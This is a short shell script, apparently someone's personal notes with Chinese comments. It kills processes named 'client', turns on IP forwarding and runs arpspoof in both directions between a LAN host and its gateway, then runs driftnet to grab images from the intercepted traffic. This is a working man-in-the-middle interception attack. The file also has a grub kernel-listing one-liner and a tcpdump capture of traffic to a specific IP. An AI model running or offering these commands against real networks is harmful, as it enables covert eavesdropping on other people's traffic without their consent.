#!/bin/sh

ps -aux |grep client | awk -F' ' '{print $2}' | xargs kill -9
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo arpspoof -i eth0 -t 192.168.1.110 192.168.1.1
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.110
sudo driftnet -i eth0

#查看内核版本
awk -F\' '$1=="menuentry " {print i++ " : " $2}' /etc/grub2.cfg

#tcpdump用法
tcpdump -s 0 -c 100 dst host 109.119.20.82 -w ./target.cap